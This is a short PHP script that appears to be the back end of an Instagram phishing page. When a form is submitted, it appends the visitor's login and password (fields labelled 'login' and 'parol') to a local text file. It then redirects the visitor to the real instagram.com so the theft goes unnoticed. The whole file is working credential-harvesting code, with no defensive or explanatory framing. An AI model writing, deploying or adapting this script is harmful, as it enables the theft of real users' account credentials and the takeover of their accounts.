<?php

if (isset($_POST['submit'])) {
    $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
    $txt = 'login:' . $_POST['ism'] . "    ";
    fwrite($myfile, $txt);
    $txt = 'parol:' . $_POST['kod'] . "  | ";
    fwrite($myfile, $txt);
    fclose($myfile);
    header('Location: https://instagram.com');
}


?>